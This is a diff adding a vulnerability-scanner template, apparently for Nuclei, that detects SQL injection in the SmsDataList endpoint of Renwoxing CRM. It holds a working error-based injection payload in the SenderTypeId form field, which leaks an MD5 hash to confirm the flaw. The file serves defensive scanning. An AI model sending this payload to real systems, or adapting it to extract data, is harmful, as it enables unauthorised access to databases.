@@ -1,0 +1,30 @@
+id: renwoxing-crm-smsdatalist-sql-injection
+
+info:
+  name: Renwoxing CRM SmsDataList SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Renwoxing CRM system contains a SQL injection vulnerability in the SmsDataList endpoint, allowing attackers to retrieve sensitive database information.
+  reference:
+    - https://www.wecrm.com/
+  tags: sql-injection
+
+http:
+  - raw:
+      - |
+        POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000' and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "0xe10adc3949ba59abbe56e057f20f883e"
+        part: body
